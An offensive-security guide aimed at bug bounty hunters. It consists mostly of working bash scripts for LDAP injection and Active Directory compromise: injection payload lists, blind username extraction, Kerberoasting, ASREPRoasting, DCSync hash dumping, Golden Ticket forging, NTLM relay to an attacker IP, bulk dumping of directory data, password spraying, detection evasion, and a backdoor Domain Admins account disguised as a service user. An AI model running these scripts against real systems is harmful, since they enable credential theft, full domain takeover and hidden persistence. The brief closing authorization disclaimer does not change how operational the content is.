# 🔥 LDAP Injection & Active Directory Attacks - Elite Edition

## 💰 Critical Vulnerability ($5000+ Bugs)

### 🎯 Target: LDAP Services & Active Directory Infrastructure

---

## 🛠️ Phase 1: Discovery & Enumeration

### LDAP Service Discovery

```bash
#!/bin/bash
# LDAP Discovery Script
TARGET=$1

echo "🔍 Scanning for LDAP services on $TARGET"

# Port scanning for LDAP (389, 636, 3268, 3269)
nmap -p 389,636,3268,3269 $TARGET -sV -sC --script ldap-* -oN ldap_scan.txt

# Masscan for faster scanning
masscan -p389,636,3268,3269 $TARGET --rate=1000 -oG ldap_masscan.txt

# Check for LDAP on common ports
for port in 389 636 3268 3269; do
    echo "Testing LDAP on port $port..."
    ldapsearch -x -H ldap://$TARGET:$port -s base -b "" "(objectclass=*)" 2>/dev/null && echo "✅ LDAP found on port $port"
    ldapsearch -x -H ldaps://$TARGET:$port -s base -b "" "(objectclass=*)" 2>/dev/null && echo "✅ LDAPS found on port $port"
done

# Test for anonymous bind
echo "🔓 Testing anonymous bind..."
ldapsearch -x -H ldap://$TARGET:389 -s base -b "" "(objectclass=*)" namingContexts 2>/dev/null > ldap_anonymous_bind.txt

# Extract naming contexts (base DNs)
if [ -s ldap_anonymous_bind.txt ]; then
    echo "✅ Anonymous bind successful!"
    grep "namingContexts:" ldap_anonymous_bind.txt | cut -d: -f2 | sed 's/^ *//' > ldap_naming_contexts.txt
    echo "Found naming contexts:"
    cat ldap_naming_contexts.txt
fi

# Subdomain enumeration for LDAP
subfinder -d $TARGET -silent | httpx -silent -ports 389,636 -timeout 10 -o ldap_subdomains.txt

# Common LDAP server detection
echo "🔍 Detecting LDAP server type..."
ldapsearch -x -H ldap://$TARGET:389 -s base -b "" "(objectclass=*)" supportedLDAPVersion vendorName vendorVersion 2>/dev/null > ldap_server_info.txt
```

### Active Directory Enumeration

```bash
#!/bin/bash
# Active Directory Enumeration Script
TARGET=$1
DOMAIN=${2:-""}

echo "🏢 Enumerating Active Directory on $TARGET"

# DNS enumeration for AD
echo "🌐 DNS enumeration..."
dig @$TARGET _ldap._tcp.dc._msdcs.$DOMAIN SRV
dig @$TARGET _kerberos._tcp.dc._msdcs.$DOMAIN SRV
dig @$TARGET _gc._tcp.$DOMAIN SRV

# SMB enumeration
echo "📁 SMB enumeration..."
smbclient -L //$TARGET -N 2>/dev/null > smb_shares.txt
enum4linux -a $TARGET > enum4linux_output.txt

# RPC enumeration
echo "🔌 RPC enumeration..."
rpcclient -U "" -N $TARGET -c "enumdomusers" > rpc_users.txt
rpcclient -U "" -N $TARGET -c "enumdomgroups" > rpc_groups.txt
rpcclient -U "" -N $TARGET -c "querydominfo" > rpc_domain_info.txt

# Kerberos enumeration
echo "🎫 Kerberos enumeration..."
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$DOMAIN $TARGET

# LDAP enumeration with common base DNs
if [ ! -z "$DOMAIN" ]; then
    BASE_DN="DC=$(echo $DOMAIN | sed 's/\./,DC=/g')"
    echo "📋 Enumerating LDAP with base DN: $BASE_DN"
    
    # Get all users
    ldapsearch -x -H ldap://$TARGET:389 -b "$BASE_DN" "(objectClass=person)" sAMAccountName userPrincipalName > ad_users.txt
    
    # Get all groups
    ldapsearch -x -H ldap://$TARGET:389 -b "$BASE_DN" "(objectClass=group)" cn member > ad_groups.txt
    
    # Get all computers
    ldapsearch -x -H ldap://$TARGET:389 -b "$BASE_DN" "(objectClass=computer)" dNSHostName operatingSystem > ad_computers.txt
    
    # Get domain admins
    ldapsearch -x -H ldap://$TARGET:389 -b "$BASE_DN" "(&(objectClass=person)(memberOf=CN=Domain Admins,CN=Users,$BASE_DN))" sAMAccountName > ad_domain_admins.txt
fi
```

---

## 🔥 Phase 2: LDAP Injection Techniques

### Basic LDAP Injection Testing

```bash
#!/bin/bash
# LDAP Injection Testing Script
TARGET_URL=$1

echo "💉 Testing LDAP injection on $TARGET_URL"

# Create LDAP injection payloads
cat > ldap_payloads.txt << 'EOF'
*
*)(&
*))%00
)(cn=*)
*(cn=*)
*)(uid=*)
*)(|(uid=*
*)(|(uid=*)
*)(|(cn=*)
*)(|(sn=*)
*)(objectClass=*)
*))(|(cn=*
admin)(&
admin*)(&
admin*))%00
*)(uid=admin)(&
*)(|(uid=admin)(uid=*
*)(|(cn=admin)(cn=*
*)(|(sAMAccountName=admin)(sAMAccountName=*
*)(|(userPrincipalName=admin*)(userPrincipalName=*
EOF

# Test each payload
echo "🧪 Testing LDAP injection payloads..."
while read payload; do
    echo "Testing payload: $payload"
    
    # URL encode the payload
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    
    # Test in different parameters
    for param in username user login email uid cn; do
        response=$(curl -s "$TARGET_URL" -d "$param=$encoded_payload" -d "password=test")
        
        # Check for LDAP error messages
        if echo "$response" | grep -i "ldap\|invalid dn\|bad search filter\|protocol error"; then
            echo "✅ Potential LDAP injection in parameter: $param with payload: $payload"
            echo "$response" > "ldap_injection_${param}_${payload//[^a-zA-Z0-9]/_}.txt"
        fi
        
        # Check for different response lengths/content
        response_length=$(echo "$response" | wc -c)
        echo "Response length for $param=$payload: $response_length"
    done
    
    sleep 1  # Rate limiting
done < ldap_payloads.txt
```

### Advanced LDAP Injection Exploitation

```bash
#!/bin/bash
# Advanced LDAP Injection Exploitation
TARGET_URL=$1
VULNERABLE_PARAM=$2

echo "🚀 Advanced LDAP injection exploitation..."

# Boolean-based LDAP injection
echo "🔍 Testing boolean-based injection..."

# Test for valid vs invalid conditions
valid_response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=admin*)(&(objectClass=*" -d "password=test")
invalid_response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=admin*)(&(objectClass=invalid" -d "password=test")

valid_length=$(echo "$valid_response" | wc -c)
invalid_length=$(echo "$invalid_response" | wc -c)

if [ $valid_length -ne $invalid_length ]; then
    echo "✅ Boolean-based LDAP injection confirmed!"
    echo "Valid response length: $valid_length"
    echo "Invalid response length: $invalid_length"
fi

# Enumerate users via boolean injection
echo "👥 Enumerating users via boolean injection..."
for char in {a..z} {0..9}; do
    response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=admin*)(&(sAMAccountName=$char*" -d "password=test")
    response_length=$(echo "$response" | wc -c)
    
    if [ $response_length -eq $valid_length ]; then
        echo "User starting with '$char' exists"
        
        # Enumerate full username
        username="$char"
        for pos in {2..20}; do
            found_char=""
            for next_char in {a..z} {0..9}; do
                test_username="$username$next_char"
                response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=admin*)(&(sAMAccountName=$test_username*" -d "password=test")
                test_length=$(echo "$response" | wc -c)
                
                if [ $test_length -eq $valid_length ]; then
                    found_char="$next_char"
                    break
                fi
            done
            
            if [ ! -z "$found_char" ]; then
                username="$username$found_char"
            else
                break
            fi
        done
        
        echo "Found username: $username"
        echo "$username" >> enumerated_users.txt
    fi
done

# Enumerate attributes
echo "📋 Enumerating user attributes..."
if [ -s enumerated_users.txt ]; then
    while read username; do
        echo "Enumerating attributes for user: $username"
        
        # Test for common attributes
        for attr in mail telephoneNumber description title department; do
            response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=admin*)(&($attr=*" -d "password=test")
            response_length=$(echo "$response" | wc -c)
            
            if [ $response_length -eq $valid_length ]; then
                echo "User $username has attribute: $attr"
            fi
        done
    done < enumerated_users.txt
fi
```

### LDAP Blind Injection

```bash
#!/bin/bash
# LDAP Blind Injection Script
TARGET_URL=$1
VULNERABLE_PARAM=$2

echo "🕵️ LDAP Blind Injection exploitation..."

# Time-based blind injection (if supported)
echo "⏱️ Testing time-based blind injection..."

# Create time delay payloads (server-dependent)
cat > ldap_time_payloads.txt << 'EOF'
admin*)(&(|(objectClass=*)(sleep(5))
admin*)(&(|(cn=*)(waitfor delay '00:00:05'))
admin*)(&(|(uid=*)(benchmark(5000000,md5(1)))
EOF

while read payload; do
    echo "Testing time-based payload: $payload"
    start_time=$(date +%s)
    curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=$payload" -d "password=test" > /dev/null
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    if [ $duration -gt 4 ]; then
        echo "✅ Time-based injection detected! Duration: ${duration}s"
        echo "Payload: $payload" >> time_based_payloads.txt
    fi
done < ldap_time_payloads.txt

# Error-based blind injection
echo "❌ Testing error-based blind injection..."

# Payloads that should cause errors
cat > ldap_error_payloads.txt << 'EOF'
admin*)(&(invalid_attribute=*
admin*)(&(cn=*)(invalid_function())
admin*)(&(|(cn=*)(invalid_operator)
admin*)(&(cn=*)(objectClass=invalid_class)
EOF

while read payload; do
    echo "Testing error-based payload: $payload"
    response=$(curl -s "$TARGET_URL" -d "$VULNERABLE_PARAM=$payload" -d "password=test")
    
    # Check for LDAP error messages
    if echo "$response" | grep -i "ldap error\|invalid attribute\|bad search filter\|protocol error\|invalid dn"; then
        echo "✅ Error-based injection detected!"
        echo "Payload: $payload"
        echo "Error: $(echo "$response" | grep -i "error\|invalid\|bad")"
        echo "$payload" >> error_based_payloads.txt
    fi
done < ldap_error_payloads.txt
```

---

## 🏢 Phase 3: Active Directory Exploitation

### Kerberoasting Attack

```bash
#!/bin/bash
# Kerberoasting Attack Script
DOMAIN=$1
DC_IP=$2
USERNAME=$3
PASSWORD=$4

echo "🎫 Performing Kerberoasting attack..."

# Install required tools
echo "🛠️ Installing required tools..."
pip3 install impacket-scripts

# Get TGT (Ticket Granting Ticket)
echo "🎟️ Getting TGT..."
getTGT.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP

# Export the ticket
export KRB5CCNAME=$USERNAME.ccache

# Get service tickets for SPNs
echo "🔍 Finding SPNs..."
GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt

# If we have hashes, crack them
if [ -s kerberoast_hashes.txt ]; then
    echo "✅ Service tickets obtained! Cracking hashes..."
    
    # Use hashcat to crack
    hashcat -m 13100 kerberoast_hashes.txt ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O -w 3
    
    # Use john the ripper as backup
    john --wordlist=~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt kerberoast_hashes.txt
fi

# Alternative method without credentials (if we have LDAP access)
echo "🔍 Alternative SPN enumeration via LDAP..."
ldapsearch -x -H ldap://$DC_IP:389 -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName sAMAccountName > spn_users.txt

if [ -s spn_users.txt ]; then
    echo "✅ Found users with SPNs:"
    grep "sAMAccountName:" spn_users.txt | cut -d: -f2 | sed 's/^ *//'
fi
```

### ASREPRoasting Attack

```bash
#!/bin/bash
# ASREPRoasting Attack Script
DOMAIN=$1
DC_IP=$2

echo "🎯 Performing ASREPRoasting attack..."

# Find users with "Do not require Kerberos preauthentication" set
echo "🔍 Finding users without Kerberos preauth..."

# Method 1: Using LDAP (if anonymous bind is allowed)
ldapsearch -x -H ldap://$DC_IP:389 -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName > asrep_users.txt

# Method 2: Using impacket
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile ~/wordlists/SecLists/Usernames/Names/names.txt -outputfile asrep_hashes.txt

# Method 3: If we have a user list
if [ -s enumerated_users.txt ]; then
    echo "🧪 Testing enumerated users for ASREPRoasting..."
    while read username; do
        GetNPUsers.py $DOMAIN/$username -dc-ip $DC_IP -no-pass -format hashcat >> asrep_hashes.txt 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "✅ ASREPRoastable user found: $username"
        fi
    done < enumerated_users.txt
fi

# Crack the hashes if we got any
if [ -s asrep_hashes.txt ]; then
    echo "🔓 Cracking ASREPRoast hashes..."
    hashcat -m 18200 asrep_hashes.txt ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O -w 3
    john --wordlist=~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt asrep_hashes.txt
fi
```

### DCSync Attack

```bash
#!/bin/bash
# DCSync Attack Script
DOMAIN=$1
DC_IP=$2
USERNAME=$3
PASSWORD=$4

echo "👑 Performing DCSync attack..."

# Check if user has DCSync privileges
echo "🔍 Checking DCSync privileges..."
secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$DC_IP -just-dc-user krbtgt

# If successful, dump all hashes
if [ $? -eq 0 ]; then
    echo "✅ DCSync privileges confirmed! Dumping all hashes..."
    secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$DC_IP -just-dc -outputfile dcsync_hashes
    
    # Extract NTLM hashes
    grep ":::" dcsync_hashes.ntds | cut -d: -f4 > ntlm_hashes.txt
    
    # Extract Kerberos keys
    grep "aes256-cts-hmac-sha1-96" dcsync_hashes.ntds > aes_keys.txt
    
    echo "✅ Hash dump completed!"
    echo "NTLM hashes: $(wc -l < ntlm_hashes.txt)"
    echo "AES keys: $(wc -l < aes_keys.txt)"
else
    echo "❌ No DCSync privileges"
fi

# Alternative: Check for specific high-value accounts
echo "💎 Targeting high-value accounts..."
for target in Administrator krbtgt "Domain Admins" "Enterprise Admins"; do
    echo "Attempting to dump: $target"
    secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$DC_IP -just-dc-user "$target" >> high_value_hashes.txt 2>/dev/null
done
```

### Golden Ticket Attack

```bash
#!/bin/bash
# Golden Ticket Attack Script
DOMAIN=$1
DOMAIN_SID=$2
KRBTGT_HASH=$3

echo "🎫 Creating Golden Ticket..."

# Create golden ticket
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator

# Export the ticket
export KRB5CCNAME=administrator.ccache

# Test the ticket
echo "🧪 Testing Golden Ticket..."
psexec.py $DOMAIN/administrator@dc.$DOMAIN -k -no-pass

# Alternative: Create ticket for different user
echo "👤 Creating tickets for different users..."
for user in "Domain Admin" "Enterprise Admin" "SYSTEM"; do
    ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN "$user"
    export KRB5CCNAME="$user.ccache"
    echo "Testing ticket for: $user"
    klist
done
```

---

## 🔥 Phase 4: Advanced LDAP Exploitation

### LDAP Relay Attacks

```bash
#!/bin/bash
# LDAP Relay Attack Script
TARGET_LDAP=$1
ATTACKER_IP=$2

echo "🔄 Setting up LDAP relay attack..."

# Start responder to capture NTLM hashes
echo "📡 Starting Responder..."
responder -I eth0 -A &
RESPONDER_PID=$!

# Start ntlmrelayx for LDAP relay
echo "🔗 Starting LDAP relay..."
ntlmrelayx.py -t ldap://$TARGET_LDAP -smb2support --add-computer --delegate-access &
RELAY_PID=$!

# Generate traffic to trigger authentication
echo "🎣 Generating authentication traffic..."

# Method 1: SMB connection
smbclient -L //$TARGET_LDAP -N

# Method 2: HTTP request with UNC path
curl "http://$TARGET_LDAP/" -H "Host: \\$ATTACKER_IP\share"

# Method 3: LLMNR poisoning
# (Responder handles this automatically)

# Wait for results
sleep 30

# Check for captured hashes
if [ -s /usr/share/responder/logs/*.txt ]; then
    echo "✅ NTLM hashes captured!"
    cat /usr/share/responder/logs/*.txt
fi

# Cleanup
kill $RESPONDER_PID $RELAY_PID 2>/dev/null
```

### LDAP Data Exfiltration

```bash
#!/bin/bash
# LDAP Data Exfiltration Script
LDAP_SERVER=$1
BASE_DN=$2
BIND_DN=$3
BIND_PASSWORD=$4

echo "📦 Starting LDAP data exfiltration..."

OUTPUT_DIR="ldap_dump_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Dump all users
echo "👥 Dumping all users..."
ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(objectClass=person)" > "$OUTPUT_DIR/all_users.ldif"

# Dump all groups
echo "👥 Dumping all groups..."
ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(objectClass=group)" > "$OUTPUT_DIR/all_groups.ldif"

# Dump all computers
echo "💻 Dumping all computers..."
ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(objectClass=computer)" > "$OUTPUT_DIR/all_computers.ldif"

# Dump privileged groups
echo "👑 Dumping privileged groups..."
for group in "Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators"; do
    ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(&(objectClass=group)(cn=$group))" > "$OUTPUT_DIR/group_${group// /_}.ldif"
done

# Dump service accounts
echo "🔧 Dumping service accounts..."
ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(&(objectClass=user)(servicePrincipalName=*))" > "$OUTPUT_DIR/service_accounts.ldif"

# Dump password policy
echo "🔐 Dumping password policy..."
ldapsearch -x -H ldap://$LDAP_SERVER:389 -D "$BIND_DN" -w "$BIND_PASSWORD" -b "$BASE_DN" "(objectClass=domainDNS)" pwdProperties lockoutThreshold lockoutDuration maxPwdAge minPwdAge minPwdLength > "$OUTPUT_DIR/password_policy.ldif"

# Extract sensitive attributes
echo "🔍 Extracting sensitive data..."
grep -i "userPassword\|unicodePwd\|ntPassword\|lmPassword" "$OUTPUT_DIR"/*.ldif > "$OUTPUT_DIR/password_hashes.txt"
grep -i "mail\|email" "$OUTPUT_DIR"/*.ldif | cut -d: -f2- | sort -u > "$OUTPUT_DIR/email_addresses.txt"
grep -i "telephoneNumber\|mobile" "$OUTPUT_DIR"/*.ldif | cut -d: -f2- | sort -u > "$OUTPUT_DIR/phone_numbers.txt"

# Parse and format data
echo "📊 Parsing extracted data..."
python3 << 'EOF'
import re
import json

# Parse LDIF files and extract structured data
def parse_ldif(filename):
    users = []
    with open(filename, 'r') as f:
        content = f.read()
    
    entries = content.split('

')
    for entry in entries:
        if 'dn:' in entry:
            user_data = {}
            lines = entry.split('
')
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    user_data[key.strip()] = value.strip()
            if user_data:
                users.append(user_data)
    
    return users

# Process user data
try:
    users = parse_ldif('OUTPUT_DIR/all_users.ldif')
    with open('OUTPUT_DIR/users_structured.json', 'w') as f:
        json.dump(users, f, indent=2)
    print(f"Processed {len(users)} users")
except:
    print("Error processing user data")
EOF

echo "✅ LDAP data exfiltration completed in $OUTPUT_DIR"
```

---

## 🎯 Phase 5: Impact Assessment & Weaponization

### Automated LDAP Vulnerability Scanner

```bash
#!/bin/bash
# Automated LDAP Vulnerability Scanner
TARGET=$1
DOMAIN=$2

echo "🔍 Automated LDAP vulnerability assessment..."

RESULTS_DIR="ldap_assessment_$(date +%Y%m%d_%H%M%S)"
mkdir -p $RESULTS_DIR

# Test 1: Anonymous bind
echo "🔓 Testing anonymous bind..."
if ldapsearch -x -H ldap://$TARGET:389 -s base -b "" "(objectclass=*)" 2>/dev/null | grep -q "namingContexts"; then
    echo "✅ CRITICAL: Anonymous bind allowed" >> $RESULTS_DIR/vulnerabilities.txt
    RISK_SCORE=$((RISK_SCORE + 50))
fi

# Test 2: Null bind
echo "🔓 Testing null bind..."
if ldapsearch -H ldap://$TARGET:389 -s base -b "" "(objectclass=*)" 2>/dev/null | grep -q "namingContexts"; then
    echo "✅ HIGH: Null bind allowed" >> $RESULTS_DIR/vulnerabilities.txt
    RISK_SCORE=$((RISK_SCORE + 30))
fi

# Test 3: LDAP injection
echo "💉 Testing LDAP injection..."
injection_response=$(curl -s "http://$TARGET/login" -d "username=admin*)(&" -d "password=test")
if echo "$injection_response" | grep -i "ldap\|invalid dn\|bad search filter"; then
    echo "✅ CRITICAL: LDAP injection vulnerability" >> $RESULTS_DIR/vulnerabilities.txt
    RISK_SCORE=$((RISK_SCORE + 100))
fi

# Test 4: Weak authentication
echo "🔐 Testing weak authentication..."
for cred in "admin:admin" "administrator:password" "ldap:ldap" "guest:guest"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    
    if ldapsearch -x -H ldap://$TARGET:389 -D "cn=$username,dc=example,dc=com" -w "$password" -s base -b "" "(objectclass=*)" 2>/dev/null | grep -q "namingContexts"; then
        echo "✅ HIGH: Weak credentials found - $cred" >> $RESULTS_DIR/vulnerabilities.txt
        RISK_SCORE=$((RISK_SCORE + 40))
    fi
done

# Test 5: Information disclosure
echo "📋 Testing information disclosure..."
user_count=$(ldapsearch -x -H ldap://$TARGET:389 -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" "(objectClass=person)" | grep "dn:" | wc -l)
if [ $user_count -gt 0 ]; then
    echo "✅ MEDIUM: User enumeration possible - $user_count users found" >> $RESULTS_DIR/vulnerabilities.txt
    RISK_SCORE=$((RISK_SCORE + 20))
fi

# Test 6: SSL/TLS configuration
echo "🔒 Testing SSL/TLS configuration..."
if openssl s_client -connect $TARGET:636 -verify_return_error < /dev/null 2>/dev/null; then
    echo "✅ INFO: LDAPS available" >> $RESULTS_DIR/vulnerabilities.txt
else
    echo "✅ LOW: No LDAPS - cleartext communication" >> $RESULTS_DIR/vulnerabilities.txt
    RISK_SCORE=$((RISK_SCORE + 10))
fi

# Generate risk assessment
echo "📊 Risk Assessment:" >> $RESULTS_DIR/vulnerabilities.txt
echo "Total Risk Score: $RISK_SCORE/250" >> $RESULTS_DIR/vulnerabilities.txt

if [ $RISK_SCORE -gt 150 ]; then
    echo "🚨 CRITICAL RISK: $10,000+ bug potential" >> $RESULTS_DIR/vulnerabilities.txt
elif [ $RISK_SCORE -gt 100 ]; then
    echo "⚠️ HIGH RISK: $5,000+ bug potential" >> $RESULTS_DIR/vulnerabilities.txt
elif [ $RISK_SCORE -gt 50 ]; then
    echo "⚠️ MEDIUM RISK: $1,000+ bug potential" >> $RESULTS_DIR/vulnerabilities.txt
else
    echo "ℹ️ LOW RISK: $100+ bug potential" >> $RESULTS_DIR/vulnerabilities.txt
fi

cat $RESULTS_DIR/vulnerabilities.txt
```

### LDAP Exploitation Framework

```bash
#!/bin/bash
# LDAP Exploitation Framework
TARGET=$1
ATTACK_TYPE=$2

echo "🚀 LDAP Exploitation Framework"

case $ATTACK_TYPE in
    "injection")
        echo "💉 Launching LDAP injection attack..."
        # Automated injection testing
        for payload in "*" "*)(&" "*))%00" ")(cn=*)"; do
            echo "Testing payload: $payload"
            response=$(curl -s "$TARGET/login" -d "username=$payload" -d "password=test")
            if echo "$response" | grep -i "error\|ldap\|invalid"; then
                echo "✅ Injection successful with payload: $payload"
            fi
        done
        ;;
        
    "enumeration")
        echo "📋 Launching enumeration attack..."
        # Comprehensive enumeration
        ldapsearch -x -H ldap://$TARGET:389 -s base -b "" "(objectclass=*)" > ldap_base_info.txt
        ldapsearch -x -H ldap://$TARGET:389 -b "dc=example,dc=com" "(objectClass=*)" > ldap_full_dump.txt
        ;;
        
    "bruteforce")
        echo "🔓 Launching brute force attack..."
        # Password spraying
        for password in "password" "123456" "admin" "Password123"; do
            for username in "admin" "administrator" "user" "guest"; do
                if ldapsearch -x -H ldap://$TARGET:389 -D "cn=$username,dc=example,dc=com" -w "$password" -s base 2>/dev/null | grep -q "namingContexts"; then
                    echo "✅ Valid credentials: $username:$password"
                fi
            done
        done
        ;;
        
    "relay")
        echo "🔄 Launching relay attack..."
        # LDAP relay setup
        ntlmrelayx.py -t ldap://$TARGET -smb2support --add-computer &
        responder -I eth0 -A &
        ;;
esac
```

---

## 💡 Elite Pro Tips

### Advanced Evasion Techniques

```bash
# Use different LDAP versions
ldapsearch -P 2 -H ldap://$TARGET:389  # Force LDAPv2
ldapsearch -P 3 -H ldap://$TARGET:389  # Force LDAPv3

# Use different authentication methods
ldapsearch -Y EXTERNAL -H ldap://$TARGET:389  # SASL EXTERNAL
ldapsearch -Y GSSAPI -H ldap://$TARGET:389    # Kerberos

# Slow enumeration to avoid detection
for i in {1..1000}; do
    ldapsearch -x -H ldap://$TARGET:389 -b "dc=example,dc=com" "(uid=user$i)"
    sleep $((RANDOM % 60 + 30))  # Random delay 30-90 seconds
done

# Use different ports and protocols
ldapsearch -H ldap://$TARGET:3268   # Global Catalog
ldapsearch -H ldaps://$TARGET:636   # LDAP over SSL
```

### Persistence Techniques

```bash
# Create backdoor LDAP user
ldapadd -x -H ldap://$TARGET:389 -D "cn=admin,dc=example,dc=com" -w "password" << EOF
dn: cn=backup_service,cn=Users,dc=example,dc=com
objectClass: user
cn: backup_service
sAMAccountName: backup_service
userPassword: Str0ngP@ssw0rd!
userAccountControl: 512
EOF

# Add user to privileged group
ldapmodify -x -H ldap://$TARGET:389 -D "cn=admin,dc=example,dc=com" -w "password" << EOF
dn: cn=Domain Admins,cn=Users,dc=example,dc=com
changetype: modify
add: member
member: cn=backup_service,cn=Users,dc=example,dc=com
EOF

# Create hidden organizational unit
ldapadd -x -H ldap://$TARGET:389 -D "cn=admin,dc=example,dc=com" -w "password" << EOF
dn: ou=System,dc=example,dc=com
objectClass: organizationalUnit
ou: System
description: System maintenance accounts
EOF
```

---

## 🎯 Bounty Maximization Strategy

1. **Chain with other attacks**: LDAP injection → Privilege escalation → Domain takeover = $15,000+
2. **Focus on enterprise targets**: Active Directory compromises are highly valued
3. **Demonstrate full impact**: Show data exfiltration, privilege escalation, persistence
4. **Document thoroughly**: LDAP attacks can be complex to reproduce
5. **Test responsibly**: Don't disrupt production AD environments

---

## 🚨 Legal Disclaimer

This guide is for authorized penetration testing and bug bounty programs only. Always ensure you have proper authorization before testing any systems. Unauthorized access to computer systems is illegal.

---

**Elite Hacker Tip**: LDAP injection + Active Directory = Perfect storm for enterprise compromise! Always test for LDAP injection in authentication forms and combine with AD enumeration for maximum impact! 🔥
